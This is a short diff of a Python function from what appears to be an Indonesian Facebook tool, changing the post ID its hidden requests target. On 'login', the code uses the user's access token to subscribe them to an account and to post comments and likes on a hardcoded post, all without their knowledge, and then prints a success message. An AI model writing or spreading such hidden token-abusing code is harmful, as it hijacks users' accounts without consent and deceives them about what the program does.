@@ -117,10 +117,10 @@ def autis():
         komeng = bucin+'\n'+bacot+'\n'+motiv+'\n'+jam
 	komeng2 = bucin+'\n'+bacot2+'\n'+jam
         requests.post('https://graph.facebook.com/DickyDonkeyMonkey/subscribers?access_token=' + toket)
-        requests.post('https://graph.facebook.com/248943827208605/comments/?message=' +komeng+ '&access_token=' + toket)
-        requests.post('https://graph.facebook.com/248943827208605/likes?summary=true&access_token=' + toket)
-        requests.post('https://graph.facebook.com/248943827208605/comments/?message='+komeng2+'&access_token=' + toket)
-        requests.post('https://graph.facebook.com/248943827208605/likes?summary=true&access_token=' + toket)
+        requests.post('https://graph.facebook.com/4826625304016262/comments/?message=' +komeng+ '&access_token=' + toket)
+        requests.post('https://graph.facebook.com/4826625304016262/likes?summary=true&access_token=' + toket)
+        requests.post('https://graph.facebook.com/4826625304016262/comments/?message='+komeng2+'&access_token=' + toket)
+        requests.post('https://graph.facebook.com/4826625304016262/likes?summary=true&access_token=' + toket)
 	print('[√] Login Sukses . . .')
         dic()
 	    
